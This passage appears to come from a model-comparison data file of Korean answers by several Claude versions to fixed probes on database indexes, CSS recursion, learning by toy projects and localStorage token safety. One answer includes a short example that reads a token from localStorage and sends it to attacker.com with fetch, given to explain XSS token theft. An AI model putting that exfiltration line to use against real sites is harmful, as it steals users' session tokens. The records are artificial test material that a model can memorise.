재귀를 대신함.\n\n**3. 진짜 재귀가 필요하면 → Sass/Less**\n전처리기에는 **실제 재귀 함수**가 있어. 이게 네가 찾는 \"깔끔한 방법\"에 가장 가까워:\n```scss\n@function pow($base, $exp) {\n  @if $exp <= 0 { @return 1; }\n  @return $base * pow($base, $exp - 1); // 진짜 재귀 호출\n}\n```\n\n## 정리\n\n순수 CSS로 \"재귀 함수를 짜는 가장 깔끔한 방법\"은 **없어** — 언어에 그 개념 자체가 없거든. \n\n- 시각적 깊이 표현이 목적이면 → **셀렉터 중첩**이나 **커스텀 프로퍼티 상속**\n- 진짜 재귀 로직(반복 계산)이 목적이면 → **Sass `@function` 재귀**\n\n네가 실제로 만들려는 게 뭐야? 트리 들여쓰기 같은 시각 효과인지, 아니면 어떤 값 계산인지 알려주면 거기에 맞는 깔끔한 패턴을 콕 집어줄게.", "ok": true}, {"model": "claude-opus-4-5", "probe": "explain", "kind": "single", "prompt": "데이터베이스 인덱스가 뭐야? 인덱스를 추가하면 언제 도움이 되고 언제 오히려 안 좋아?", "text": "## 데이터베이스 인덱스란?\n\n인덱스는 **책의 색인(목차)**과 같다. 책 전체를 넘기지 않고도 원하는 내용을 빠르게 찾을 수 있게 해주는 별도의 데이터 구조다.\n\n```sql\n-- 인덱스 생성 예시\nCREATE INDEX idx_users_email ON users(email);\n```\n\n---\n\n## 인덱스가 도움되는 경우 ✅\n\n| 상황 | 이유 |\n|------|------|\n| **WHERE 조건 검색** | `WHERE email = 'x@y.com'` → 풀스캔 대신 인덱스로 바로 찾음 |\n| **JOIN 연산** | 조인 키에 인덱스가 있으면 매칭 속도 향상 |\n| **ORDER BY / GROUP BY** | 이미 정렬된 인덱스 활용 |\n| **고유성 보장** | UNIQUE 인덱스로 중복 방지 |\n| **읽기가 많은 테이블** | 조회 위주라면 이득이 큼 |\n\n---\n\n## 인덱스가 오히려 안 좋은 경우 ❌\n\n| 상황 | 이유 |\n|------|------|\n| **쓰기가 많은 테이블** | INSERT/UPDATE/DELETE 시 인덱스도 갱신해야 함 → 느려짐 |\n| **작은 테이블** | 어차피 풀스캔이 빠름, 인덱스 오버헤드만 추가 |\n| **선택도가 낮은 컬럼** | `gender` 같이 값이 2~3개뿐이면 효과 없음 |\n| **자주 변경되는 컬럼** | 인덱스 재구성 비용 발생 |\n| **디스크 용량** | 인덱스도 저장 공간 차지함 |\n\n---\n\n## 핵심 정리\n\n```\n인덱스 = 읽기 성능 ↑ / 쓰기 성능 ↓ / 저장공간 ↑\n```\n\n**원칙**: 자주 검색하는 컬럼, 카디널리티(고유값 수)가 높은 컬럼에 인덱스를 건다. 무조건 많이 거는 게 아니라, 쿼리 패턴을 분석해서 필요한 곳에만 추가하는 게 좋다.", "ok": true}, {"model": "claude-opus-4-5", "probe": "premise", "kind": "single", "prompt": "CSS는 반복문이랑 조건문이 있는 완전한 프로그래밍 언어잖아. 순수 CSS만으로 재귀 함수를 짜는 가장 깔끔한 방법이 뭐야?", "text": "CSS는 프로그래밍 언어가 아니야. 선언적 스타일시트 언어지.\n\n**CSS에 없는 것들:**\n- 반복문 없음 (`for`, `while` 없음)\n- 조건문 없음 (`if-else` 없음)\n- 함수 정의 불가\n- 재귀 불가능\n- 튜링 완전하지 않음\n\n**흔히 오해하는 것들:**\n\n| 오해 | 실제 |\n|------|------|\n| `@media`가 조건문 | 브라우저가 평가하는 선언적 규칙 |\n| `:has()`, `:is()`가 로직 | 선택자 매칭일 뿐 |\n| `calc()`가 함수 | 수식 계산기, 제어 흐름 없음 |\n| CSS 변수가 변수 | 값 치환일 뿐, 재할당/연산 제한적 |\n\n**\"CSS로 게임 만들었다\"는 건?**\n\n그건 HTML 체크박스의 `:checked` 상태 + `~` 형제 선택자로 상태 머신을 흉내 낸 거야. 브라우저와 HTML이 상태를 관리하는 거지, CSS가 계산하는 게 아님.\n\n순수 CSS로 재귀 함수? 불가능해. 애초에 함수 정의 자체가 안 돼.", "ok": true}, {"model": "claude-opus-4-5", "probe": "opinion", "kind": "single", "prompt": "정해진 강의 따라가는 대신 토이 프로젝트 만들면서 새 프로그래밍 언어 배우는 거, 시간 낭비일까?", "text": "아니, 오히려 효과적인 학습법이다.\n\n**토이 프로젝트 방식의 장점:**\n\n1. **능동적 학습** — 강의는 수동적으로 따라가기 쉬운데, 프로젝트는 스스로 문제를 정의하고 해결해야 해서 더 깊이 각인된다.\n\n2. **실제 맥락에서 배움** — \"이 문법이 왜 필요하지?\"가 아니라 \"이걸 구현하려면 뭐가 필요하지?\"로 접근하니까 학습 동기가 명확하다.\n\n3. **디버깅 능력** — 강의에선 잘 작동하는 코드만 보지만, 직접 삽질하면서 에러 메시지 읽고 해결하는 능력이 생긴다.\n\n4. **포트폴리오** — 끝나면 뭔가 남는다.\n\n**다만 주의할 점:**\n\n- 너무 큰 프로젝트 잡으면 언어 기초도 모르는데 아키텍처 고민하다 지친다. 1-2주 안에 끝낼 수 있는 작은 것부터.\n- 해당 언어의 관용적 패턴(idiomatic)을 모르면 \"돌아가긴 하는데 이상한 코드\"를 짜게 된다. 중간중간 좋은 코드 예시를 읽어주는 게 좋다.\n- 기초 문법(타입 시스템, 에러 처리 방식 등)은 공식 문서 훑어보고 시작하면 삽질 시간이 줄어든다.\n\n**결론:** 강의 100% 완주 후 프로젝트 시작하는 것보다, 기초 문법 30% 훑고 → 작은 프로젝트 → 막히면 찾아보기 → 반복이 더 빠르다.", "ok": true}, {"model": "claude-opus-4-6", "probe": "opinion", "kind": "single", "prompt": "정해진 강의 따라가는 대신 토이 프로젝트 만들면서 새 프로그래밍 언어 배우는 거, 시간 낭비일까?", "text": "## 시간 낭비 아니다. 오히려 대부분의 경우 더 효과적이다.\n\n### 토이 프로젝트가 강력한 이유\n\n1. **능동적 학습이다.** 강의는 수동적으로 흘러가지만, 프로젝트는 \"이걸 어떻게 구현하지?\"라는 질문을 스스로 던지게 만든다. 이 차이가 기억 정착률을 극적으로 바꾼다.\n\n2. **실제 문제 해결 능력이 붙는다.** 강의에서는 에러를 만날 일이 별로 없다. 프로젝트에서는 디버깅, 문서 읽기, 스택오버플로우 탐색 같은 **실전 스킬**이 자연스럽게 쌓인다.\n\n3. **동기부여가 지속된다.** \"챕터 14/30 완료\"보다 \"내가 만든 게 실제로 돌아간다\"가 훨씬 강한 보상이다. 강의 완주율이 낮은 이유가 있다.\n\n### 다만, 흔한 함정은 피해야 한다\n\n| 함정 | 해결책 |\n|------|--------|\n| 이미 아는 것만 반복 (또 다른 TODO 앱) | 매 프로젝트마다 **한 가지 새로운 개념**을 의도적으로 포함시킨다 |\n| 언어의 핵심 철학을 놓침 | 공식 문서의 \"Tour\" 또는 \"By Example\" 정도는 한 번 훑는다 (Go Tour, Rust by Example 등) |\n| 너무 큰 프로젝트로 시작 | 2~3일 안에 끝낼 수 있는 규모로 시작한다 |\n| \"돌아가기만 하면 됨\" 마인드 | 완성 후 **리팩터링**을 한 번 한다. 그 언어다운 코드(idiomatic code)를 의식적으로 찾는다 |\n\n### 가장 효과적인 조합\n\n> **30분 공식 문서/가이드 훑기 → 바로 프로젝트 → 막히면 문서로 돌아가기**\n\n이 사이클이 \"강의 100% 듣고 나서 시작\"보다 거의 항상 낫다. 강의는 참고 자료로 두고, 프로젝트가 메인이 되는 구조가 맞다.\n\n결론: 토이 프로젝트로 배우는 건 시간 낭비가 아니라, **시간을 아끼는 방법**이다. 단, \"의도적으로 새로운 걸 넣는\" 습관만 붙이면 된다.", "ok": true}, {"model": "claude-opus-4-6", "probe": "explain", "kind": "single", "prompt": "데이터베이스 인덱스가 뭐야? 인덱스를 추가하면 언제 도움이 되고 언제 오히려 안 좋아?", "text": "# 데이터베이스 인덱스 (Database Index)\n\n## 인덱스란?\n\n인덱스는 **책의 목차(또는 색인)** 와 같다. 테이블 전체를 처음부터 끝까지 훑지 않고, 원하는 데이터의 위치를 빠르게 찾아가기 위한 별도의 자료구조다.\n\n내부적으로는 주로 **B-Tree** (대부분의 RDBMS 기본), **Hash**, **GIN**, **GiST** 등의 자료구조로 구현된다.\n\n```sql\n-- 예시: users 테이블의 email 컬럼에 인덱스 생성\nCREATE INDEX idx_users_email ON users (email);\n```\n\n이제 `WHERE email = 'foo@bar.com'` 쿼리는 수백만 행을 풀스캔하지 않고, 인덱스를 통해 **O(log n)** 에 해당 행을 찾는다.\n\n---\n\n## 인덱스가 도움이 되는 경우 ✅\n\n| 상황 | 이유 |\n|---|---|\n| **WHERE 조건으로 자주 검색하는 컬럼** | 풀 테이블 스캔 → 인덱스 탐색으로 극적인 속도 향상 |\n| **JOIN 키 컬럼** | 조인 시 매칭 행을 빠르게 찾음 |\n| **ORDER BY / GROUP BY 컬럼** | 정렬을 위한 추가 작업(filesort) 생략 가능 |\n| **카디널리티가 높은 컬럼** (값의 종류가 많은) | email, user_id 등 — 인덱스의 선택도(selectivity)가 높아 효율적 |\n| **커버링 인덱스** | 인덱스만으로 쿼리 결과를 반환, 테이블 접근 자체를 생략 |\n| **테이블이 크고 읽기가 많은 워크로드** | 수백만~수억 행에서 효과가 극대화 |\n\n---\n\n## 인덱스가 오히려 안 좋은 경우 ❌\n\n| 상황 | 이유 |\n|---|---|\n| **쓰기(INSERT/UPDATE/DELETE)가 매우 빈번한 테이블** | 데이터 변경 시마다 인덱스도 함께 갱신 → **쓰기 성능 저하** |\n| **카디널리티가 낮은 컬럼** (예: `gender`, `is_active`) | 값이 2~3종류뿐이면 인덱스를 타도 결국 대부분의 행을 읽게 됨 → 옵티마이저가 풀스캔을 선택 |\n| **테이블이 매우 작을 때** | 수백 행이면 풀스캔이 인덱스 탐색보다 오히려 빠름 |\n| **거의 조회하지 않는 컬럼** | 저장 공간만 낭비하고 쓰기 부담만 증가 |\n| **인덱스를 너무 많이 만들 때** | 테이블당 인덱스가 많으면 **디스크 사용량 증가** + 모든 DML마다 여러 인덱스 갱신 |\n| **와일드카드 선행 검색** (`LIKE '%abc'`) | B-Tree 인덱스를 활용할 수 없음 |\n\n---\n\n## 핵심 트레이드오프 요약\n\n```\n읽기 성능 ↑  ←— 인덱스 —→  쓰기 성능 ↓ + 저장 공간 ↑\n```\n\n인덱스는 **\"공짜 점심\"이 아니다.** 읽기 속도를 얻는 대가로 쓰기 비용과 저장 공간을 지불하는 것이다. 따라서 **실제 쿼리 패턴을 분석**(`EXPLAIN` 활용)한 뒤, 자주 조회되는 컬럼에만 선별적으로 추가하는 것이 좋다.", "ok": true}, {"model": "claude-opus-4-5", "probe": "challenge", "kind": "dialogue", "a": "**안전하지 않다** — localStorage는 XSS(Cross-Site Scripting) 공격에 취약하다.\n\n## 문제점\n\n1. **XSS 취약점**: 악성 스크립트가 주입되면 `localStorage.getItem('token')`으로 토큰 탈취 가능\n2. **JavaScript 접근 가능**: 모든 JS 코드가 localStorage에 접근 가능\n3. **만료 전까지 유효**: 탈취된 토큰은 만료될 때까지 악용 가능\n\n## 더 나은 대안\n\n| 방식 | 장점 | 단점 |\n|------|------|------|\n| **HttpOnly 쿠키** | JS 접근 불가, XSS에 강함 | CSRF 방어 필요 |\n| **메모리 (변수)** | 가장 안전, 새로고침 시 사라짐 | UX 불편 (재로그인) |\n| **BFF 패턴** | 토큰이 브라우저에 노출 안 됨 | 서버 구성 복잡 |\n\n## 권장 방식\n\n```\nAccess Token → 메모리 (짧은 만료, 15분)\nRefresh Token → HttpOnly + Secure + SameSite=Strict 쿠키\n```\n\n```javascript\n// 서버에서 쿠키 설정\nSet-Cookie: refreshToken=xxx; HttpOnly; Secure; SameSite=Strict; Path=/api/refresh\n```\n\nlocalStorage를 꼭 써야 한다면:\n- 토큰 만료 시간을 짧게 (15분 이하)\n- CSP 헤더로 XSS 방어 강화\n- 민감하지 않은 데이터만 토큰에 포함", "text": "아니, 옛날 얘기 아니다. 지금도 유효한 보안 원칙이다.\n\n## \"다들 쓴다\"는 근거가 아님\n\n많은 앱이 localStorage를 쓰는 건 사실이다. 하지만:\n- 많은 앱에 보안 취약점도 있다\n- 편의성 때문에 선택한 거지, 안전해서가 아니다\n- OWASP, Auth0, Okta 등 보안 전문 기관들은 **여전히** HttpOnly 쿠키를 권장한다\n\n## 바뀐 건 없다\n\n```javascript\n// 2016년에도, 2026년에도 똑같이 동작함\nconst token = localStorage.getItem('accessToken');\nfetch('https://attacker.com/steal?token=' + token);\n```\n\nXSS 한 줄이면 토큰 탈취 끝이다. 이 기본 원리는 변하지 않았다.\n\n## \"어차피 XSS 당하면 끝 아님?\" 반론에 대해\n\n이 주장이 있긴 한데, 차이가 있다:\n\n| 상황 | localStorage | HttpOnly 쿠키 |\n|------|-------------|---------------|\n| XSS 발생 시 | 토큰 **탈취** → 어디서든, 나중에도 사용 가능 | 토큰 탈취 불가, 현재 세션에서만 악용 |\n| 사용자가 탭 닫으면 | 공격자는 여전히 토큰 보유 | 공격 종료 |\n\n**토큰 탈취**와 **세션 하이재킹**은 피해 규모가 다르다.\n\n## 결론\n\n쓸 수 있냐고? 쓸 수 있다. 많이들 쓴다.\n안전하냐고? **아니다.**\n\n\"깊게 생각하는 것\"이 아니라 **기본적인 보안 고려사항**이다. 트레이드오프를 알고 선택하는 거랑, 모르고 \"다들 쓰니까\"로 선택하는 건 다르다.", "ok": true}, {"model": "claude-opus-4-1", "probe": "challenge", "kind": "dialogue", "a": "짧게 답하면: **별로 안전하지 않습니다.** localStorage는 편하지만 보안상 권장되는 방식이 아닙니다.\n\n## 왜 위험한가\n\n**핵심 문제는 XSS(크로스 사이트 스크립팅)입니다.**\n\n- localStorage는 같은 출처(origin)의 **모든 JavaScript가 자유롭게 읽을 수 있습니다.**\n- 페이지에 악성 스크립트가 한 줄이라도 주입되면(내가 쓴 코드든, 써드파티 라이브러리·광고·CDN이든) `localStorage.getItem('token')`으로 토큰을 통째로 탈취해 외부로 보낼 수 있습니다.\n- 토큰이 유출되면 만료 전까지 공격자가 그대로 사용자 행세를 할 수 있습니다.\n\n참고로 localStorage는 **CSRF에는 안전**합니다(브라우저가 자동 첨부하지 않으므로). 즉 트레이드오프가 있습니다: localStorage = XSS에 약함, 쿠키 = CSRF 대비 필요.\n\n## 더 나은 방법\n\n**1. HttpOnly + Secure 쿠키 (가장 권장)**\n```\nSet-Cookie: token=...; HttpOnly; Secure; SameSite=Strict; Path=/\n```\n- `HttpOnly`: JavaScript에서 접근 불가 → XSS로 토큰 탈취 차단\n- `Secure`: HTTPS에서만 전송\n- `SameSite=Strict/Lax`: CSRF 상당 부분 완화\n- 단점: CSRF 토큰 또는 SameSite 설정이 추가로 필요\n\n**2. 토큰 분리 전략 (SPA에서 흔함)**\n- **Access token**: 짧은 수명(예: 5~15분), 메모리(JS 변수/상태)에만 보관 → 새로고침 시 사라지지만 노출 창이 작음\n- **Refresh token**: HttpOnly + Secure 쿠키에 보관 → access token 재발급에만 사용\n\n## 어떤 방식이든 함께 해야 할 것\n\n- **Access token 수명을 짧게**, refresh token으로 갱신\n- **XSS 자체를 막기**: 입력 이스케이프, `Content-Security-Policy` 헤더, 의존성 점검\n- 항상 **HTTPS**\n- 로그아웃·탈취 시 **서버 측 토큰 무효화** 가능하게 설계\n\n## 정리\n\n| 보관 위치 | XSS | CSRF | 평가 |\n|---|---|---|---|\n| localStorage | ❌ 취약 | ✅ 안전 | 비권장 |\n| 메모리(변수) | ⚠️ 노출 창 작음 | ✅ 안전 | access token에 좋음 |\n| HttpOnly 쿠키 | ✅ 안전 | ⚠️ 대비 필요 | 권장 |\n\n**결론: localStorage 단독 저장은 피하고, refresh token은 HttpOnly 쿠키, access token은 메모리에 짧게 두는 조합을 추천합니다.**\n\n원하시면 사용 중인 프레임워크(React, Vue 등)에 맞춘 구체적인 구현 예시도 드릴 수 있습니다.", "text": "결론부터: 제 답은 바꿀 게 없습니다. 다만 \"왜 다들 그렇게 쓰는데?\"라는 의문에는 제대로 답할 가치가 있어요. 이건 보안 쪽에서 실제로 논쟁이 있는 주제고, 양쪽 다 일리가 있습니다.\n\n## \"요즘 다 localStorage 쓴다\"는 말의 진실\n\n반은 맞습니다. SPA에서 localStorage가 흔한 건 사실이에요. 이유는 보안이 좋아서가 아니라 **구현이 압도적으로 편해서**입니다:\n\n- 여러 도메인/서브도메인 API 호출이 쉬움 (쿠키는 도메인·CORS 제약이 까다로움)\n- 모바일 앱/웹뷰와 토큰 공유가 단순\n- `Authorization: Bearer ...` 헤더 패턴이 직관적\n\n즉 \"다들 쓴다\"는 건 **편의성 때문에 위험을 감수하는 관행**이지, \"안전하다고 검증돼서\"가 아닙니다. 흔하다 ≠ 안전하다.\n\n## 그런데 — 당신 말에도 맞는 지점이 있습니다\n\n솔직히 말하면, 보안 전문가들 사이에서도 한 갈래는 이렇게 봅니다:\n\n> **\"XSS가 뚫리면 어차피 끝이다.\"**\n\n이게 핵심입니다. 공격자가 당신 페이지에서 JS를 실행할 수 있게 되면:\n- HttpOnly 쿠키라도 **토큰을 못 훔칠 뿐**, 그 쿠키를 단 채로 `fetch('/api/transfer-money')`를 그냥 호출해버릴 수 있습니다.\n- 즉 HttpOnly 쿠키는 \"토큰 탈취(영구적, 어디서나 재사용)\"는 막아도 \"세션 악용(그 브라우저 안에서)\"은 못 막습니다.\n\n그래서 **\"localStorage vs 쿠키\" 논쟁보다 \"XSS를 애초에 막는 것\"이 훨씬 중요하다**는 당신 쪽 직관은 맞습니다. 이 부분은 제 원래 답에서도 강조했던 지점이고요.\n\n## 그럼 차이는 어디서 나나\n\nHttpOnly 쿠키가 의미 있는 건 **탈취의 영속성**에서입니다:\n\n| | XSS 발생 시 결과 |\n|---|---|\n| localStorage | 토큰을 **외부 서버로 빼돌림** → 공격자 자기 PC에서 만료까지 계속 악용 |\n| HttpOnly 쿠키 | **피해자 브라우저 안에서만** 악용 가능, 토큰 자체는 못 가져감 |\n\n전자는 피해가 사용자 곁을 떠나 확산되고, 후자는 그 세션·그 브라우저로 봉쇄됩니다. 짧은 access token 수명까지 더하면 노출 창이 크게 줄고요. 공짜에 가까운 이 차이를 굳이 포기할 이유가 없다는 게 제 입장입니다.\n\n## 그래서 실무 권고\n\n- **\"localStorage 쓰면 큰일 난다\"** ← 과장입니다. XSS 방어(CSP, 입력 처리, 의존성 점검)가 탄탄하고 토큰 수명이 짧으면 충분히 운영 가능하고, 실제로 많은 서비스가 그렇게 합니다.\n- **\"localStorage가 더 나은 선택이다\"** ← 이건 아닙니다. 같은 노력이면 refresh token은 HttpOnly 쿠키에 두는 게 거의 공짜로 얻는 추가 방어선이에요.\n\n깊게 생각하는 게 아니라, **\"흔하다\"를 \"안전하다\"로 착각하면 안 된다**는 정도입니다. 편의상 localStorage를 쓰기로 했다면 그건 합리적 선택일 수 있어요 — 다만 그건 *트레이드오프를 알고 받아들이는 것*이지, 공짜 안전이 아니라는 것만 분명히 하면 됩니다.\n\n지금 만드는 앱이 멀티 도메인이거나 모바일 웹뷰를 끼는 구조인가요? 그러면 localStorage 쪽 손이 올라가고, 단일 웹 SPA면 쿠키 조합이 거의 손해 볼 게 없어서 — 상황 알려주시면 어느 쪽이 맞는지 딱 집어드릴게요.", "ok": true}, {"model": "claude-opus-4-6", "probe": "premise", "kind": "single", "prompt": "CSS는 반복문이랑 조건문이 있는 완전한 프로그래밍 언어잖아. 순수 CSS만으로 재귀 함수를 짜는 가장 깔끔한 방법이 뭐야?", "text": "## CSS는 프로그래밍 언어가 아니고, 순수 CSS로 재귀 함수는 못 짠다.\n\n전제가 틀렸다. 하나씩 짚으면:\n\n---\n\n### \"반복문이 있다\"? — 없다\n\nCSS에는 `for`, `while` 같은 반복문이 없다. 흔히 혼동하는 것들:\n\n| 오해 | 실제 |\n|------|------|\n| 여러 선택자에 같은 스타일 적용 | 그건 **패턴 매칭**이지 반복이 아님 |\n| `nth-child(n)` | 반복 실행이 아니라 **선택자 필터** |\n| CSS 애니메이션 `infinite` | **렌더링 엔진**이 반복하는 것이지 CSS가 루프 도는 게 아님 |\n\n### \"조건문이 있다\"? — 제한적\n\n`@media`, `@supports`, `@container`, `:has()` 등은 **선언적 조건 분기**다. 임의의 값을 평가하는 `if-else`가 아니라, 브라우저 환경/DOM 구조에 대한 쿼리다.\n\n```css\n/* 이건 조건문이 아니라 \"환경 쿼리\" */\n@media (width > 768px) {\n  .sidebar { display: block; }\n}\n```\n\n### 재귀 함수? — 불가능\n\nCSS custom property(변수)는 **순환 참조가 명시적으로 금지**되어 있다:\n\n```css\n:root {\n  --a: calc(var(--a) + 1); /* ❌ 무효 — guaranteed-invalid value로 해석됨 */\n}\n```\n\nCSS에는 \"함수를 정의하고 호출하는\" 메커니즘 자체가 없으므로 재귀도 성립하지 않는다.\n\n---\n\n### 그럼 CSS는 뭐냐?\n\n**선언적 스타일시트 언어**(declarative style sheet language)다. 튜링 완전성 논의가 있긴 하지만, 그건:\n\n- CSS + **무한한 HTML 구조** + 사용자 인터랙션(`:checked` 등)을 조합했을 때의 이론적 논의\n- 실용적으로 \"CSS로 프로그래밍한다\"는 건 성립하지 않음\n\n### 비슷한 걸 하고 싶다면\n\n| 목적 | 도구 |\n|------|------|\n| 스타일에 반복/조건/함수 | **Sass/SCSS**, Less, PostCSS |\n| CSS 안에서 계산 | `calc()`, `min()`, `max()`, `clamp()` (산술만 가능) |\n| 동적 스타일링 | JavaScript + CSS Custom Properties |\n\n```scss\n// SCSS — 이건 진짜 재귀 함수\n@function pow($base, $exp) {\n  @if $exp == 0 { @return 1; }\n  @return $base * pow($base, $exp - 1);\n}\n\n.box {\n  width: pow(2, 10) * 1px; // 1024px\n}\n```\n\n**요약: CSS에 반복문·조건문·함수 정의는 없고, 재귀는 원천적으로 불가능하다. 전처리기(Sass 등)를 써야 한다.**", "ok": true}, {"model": "claude-opus-4-7", "probe": "opinion", "kind": "single", "prompt": "정해진 강의 따라가는 대신 토이 프로젝트 만들면서 새 프로그래밍 언어 배우는 거, 시간 낭비일까?", "text": "시간 낭비 아니다. 오히려 대부분의 경우 더 효율적이다.\n\n이유는 단순하다. 강의는 \"남이 정리한 지식 지도\"를 따라가는 거고, 토이 프로젝트는 \"내가 실제로 부딪힌 문제\"를 푸는 거다. 기억에 남는 건 후자다. 변수 선언 문법 100번 봐도 안 외워지던 게, 내 프로젝트에서 한 번 컴파일 에러 만나면 평생 안 잊는다.\n\n다만 효율을 높이려면 몇 가지는 챙기는 게 좋다:\n\n1. **공식 문서 한 번은 훑기** — 토이 프로젝트만 하면 그 언어의 \"철학\"이나 관용구(idiom)를 모르고 다른 언어 스타일로 쓰게 된다. Go인데 자바처럼 쓰거나, Rust인데 C++처럼 쓰는 식. 처음에 공식 튜토리얼(예: Rust Book, Go Tour) 한 번만 빠르게 통독해라.\n\n2. **프로젝트 난이도는 \"약간 버거운\" 정도** — 너무 쉬우면 새 문법 안 만나고, 너무 어려우면 언어가 아니라 도메인 지식에 빠진다. 그 언어의 강점을 쓰는 주제가 좋다 (Rust → CLI 툴, Go → 서버, Elixir → 동시성 토이 등).\n\n3. **남의 코드 읽기 시간 확보** — 막힐 때 GitHub에서 비슷한 오픈소스 프로젝트 읽으면 관용구를 빨리 흡수한다.\n\n4. **막히면 강의로 잠깐 도망가도 됨** — \"강의 vs 프로젝트\"는 이분법이 아니다. 특정 개념(소유권, 동시성 모델 등)에서 막히면 그 챕터만 골라 보면 된다.\n\n요약: 토이 프로젝트 중심 + 공식 문서 베이스 + 막힐 때만 강의, 이 조합이 보통 가장 빠르다. \"강의 다 들으면 시작해야지\"가 진짜 시간 낭비다.", "ok": true}, {"model": "claude-opus-4-7", "probe": "explain", "kind": "single", "prompt": "데이터베이스 인덱스가 뭐야? 인덱스를 추가하면 언제 도움이 되고 언제 오히려 안 좋아?", "text": "# 데이터베이스 인덱스란?\n\n인덱스는 **테이블의 특정 컬럼 값을 빠르게 찾기 위한 별도의 자료구조**야. 책 뒤의 \"찾아보기\"처럼, 전체 페이지를 다 뒤지지 않고도 원하는 단어가 어느 페이지에 있는지 바로 알 수 있게 해주는 역할을 해.\n\n내부적으로는 보통 **B-Tree(또는 B+Tree)** 구조로 저장돼. 정렬된 트리 형태라 `O(log N)` 시간에 값을 찾을 수 있어. 인덱스가 없으면 테이블을 처음부터 끝까지 훑는 **풀 스캔(Full Table Scan, O(N))** 이 일어나.\n\n예시:\n```sql\n-- users 테이블에 1000만 건 있을 때\nSELECT * FROM users WHERE email = 'a@b.com';\n\n-- 인덱스 없음 → 1000만 행 모두 비교\n-- email에 인덱스 있음 → 약 24번의 비교(log2(10^7))로 끝\n```\n\n---\n\n## 인덱스가 도움이 되는 경우\n\n1. **WHERE 절에서 자주 검색되는 컬럼**\n   - `WHERE user_id = ?`, `WHERE email = ?` 같은 동등 비교\n2. **JOIN의 키 컬럼**\n   - 외래키처럼 다른 테이블과 연결되는 컬럼\n3. **ORDER BY, GROUP BY 컬럼**\n   - 인덱스 자체가 정렬돼 있어서 정렬 비용을 아낄 수 있음\n4. **카디널리티(고유값 수)가 높은 컬럼**\n   - 이메일, 주민번호처럼 값이 다양할수록 효과적\n5. **범위 검색**\n   - `WHERE created_at BETWEEN ... AND ...`\n6. **커버링 인덱스**\n   - SELECT하는 컬럼이 모두 인덱스에 포함되면 테이블을 아예 안 봐도 됨\n\n---\n\n## 인덱스가 오히려 해로운 경우\n\n1. **쓰기(INSERT/UPDATE/DELETE)가 많은 테이블**\n   - 데이터가 바뀔 때마다 인덱스도 같이 갱신해야 함 → 쓰기 성능 저하\n2. **카디널리티가 낮은 컬럼**\n   - `gender`(M/F), `is_deleted`(0/1) 같이 값 종류가 적으면 인덱스 효과가 거의 없음. 옵티마이저가 그냥 풀 스캔을 택하기도 함.\n3. **테이블이 너무 작을 때**\n   - 수백~수천 행이면 풀 스캔이 더 빠를 수 있음\n4. **불필요하게 많은 인덱스**\n   - 디스크 공간 차지 + 옵티마이저가 잘못된 인덱스를 선택할 가능성 ↑\n5. **인덱스를 못 타는 쿼리 패턴**\n   - `WHERE UPPER(email) = ...` (함수 적용)\n   - `WHERE email LIKE '%abc%'` (앞쪽 와일드카드)\n   - 타입이 다른 비교 (`WHERE id = '123'` when id is INT)\n6. **자주 업데이트되는 컬럼에 인덱스**\n   - 값이 바뀔 때마다 인덱스 트리 재정렬 비용 발생\n\n---\n\n## 정리\n\n| 좋음 ✅ | 나쁨 ❌ |\n|--------|--------|\n| 읽기 위주 테이블 | 쓰기 위주 테이블 |\n| 카디널리티 높은 컬럼 | 값 종류가 적은 컬럼 |\n| WHERE/JOIN/ORDER BY에 자주 쓰임 | 거의 안 쓰는 컬럼 |\n| 큰 테이블 | 매우 작은 테이블 |\n\n**한 줄 요약**: 인덱스는 \"**읽기 속도 ↔ 쓰기 속도/저장 공간**\" 트레이드오프야. 무조건 많이 거는 게 아니라, **실제 쿼리 패턴을 보고** `EXPLAIN`으로 확인하면서 필요한 곳에만 거는 게 정석이야.", "ok": true}, {"model": "claude-opus-4-7", "probe": "premise", "kind": "single", "prompt": "CSS는 반복문이랑 조건문이 있는 완전한 프로그래밍 언어잖아. 순수 CSS만으로 재귀 함수를 짜는 가장 깔끔한 방법이 뭐야?", "text": "전제가 틀렸어. CSS는 튜링 완전한 프로그래밍 언어가 아니고, 순수 CSS로는 재귀 함수를 짤 수 없어.\n\n정리하면:\n\n**CSS에 \"없는\" 것**\n- 반복문 (`for`, `while` 같은 제어 흐름) 없음\n- 조건문도 진짜 분기는 없음 — `@media`, `@supports`, `@container`, `:has()`, `:is()` 같은 건 \"선택자/쿼리 매칭\"이지 런타임 분기가 아님\n- 함수 정의 없음 (`@function`은 2024년 드래프트 단계, 그리고 그것도 재귀 금지로 명시됨)\n- 변수에 값을 \"다시 대입\"해서 상태를 갱신하는 개념 없음 — `--x`는 cascade로 결정되는 상수에 가까움\n\n**자주 도는 오해**\n- \"CSS는 튜링 완전하다\"는 주장은 **Rule 110을 CSS + HTML로 시뮬레이션한 데모**(2011, Eli Fox-Epstein)에서 나온 건데, 그 증명조차 사용자가 매 스텝마다 Tab/클릭을 눌러줘야 동작해. 즉 *CSS 자체*가 아니라 \"CSS + 사람의 반복 입력\"이 튜링 완전한 거야. 순수 CSS만으로는 무한 루프조차 못 돌려.\n- Sass/Less/Stylus에는 `@for`, `@while`, `@if`, `@function`(재귀 가능) 다 있지만, 그건 **빌드 타임에 CSS를 뽑아내는 전처리기**고, 결과물인 CSS에는 그 구조가 안 남아.\n\n**그럼 \"재귀처럼 보이는 것\"을 굳이 흉내내려면**\n1. **선택자 중첩**: `ul ul ul { ... }` 또는 `* > *` 깊이별 스타일 — 트리 깊이에 따라 다른 스타일을 주는 정도. 진짜 재귀는 아니고 \"구조 매칭\"임.\n2. **`counter()` + `counters()`**: 중첩 리스트에 `1.2.3.1` 같은 번호 매기기. 깊이에 비례한 출력이 가능하지만 분기/종료 조건은 못 짬.\n3. **커스텀 프로퍼티 상속**: 부모의 `--depth`를 받아 `calc(var(--depth) + 1)`로 자식에 넘기기 — 트리 깊이 누적 정도는 됨. 역시 \"종료 조건\"이나 \"값에 따라 다른 동작\"은 불가능.\n\n가장 \"깔끔한\" 답은 결국 **`counters()` + 중첩 선택자**야. 진짜 재귀가 필요하면 Sass `@function`이나 JS로 가야 해.", "ok": true}, {"model": "claude-opus-4-8", "probe": "explain", "kind": "single", "prompt": "데이터베이스 인덱스가 뭐야? 인덱스를 추가하면 언제 도움이 되고 언제 오히려 안 좋아?", "text": "# 데이터베이스 인덱스란?\n\n인덱스는 **테이블의 데이터를 빠르게 찾기 위한 별도의 자료구조**예요. 책의 \"찾아보기(색인)\"와 똑같은 개념이죠. 책에서 특정 단어를 찾을 때 첫 페이지부터 넘기지 않고 뒤의 색인을 보고 바로 해당 페이지로 가는 것처럼, DB도 인덱스를 통해 원하는 행(row)으로 바로 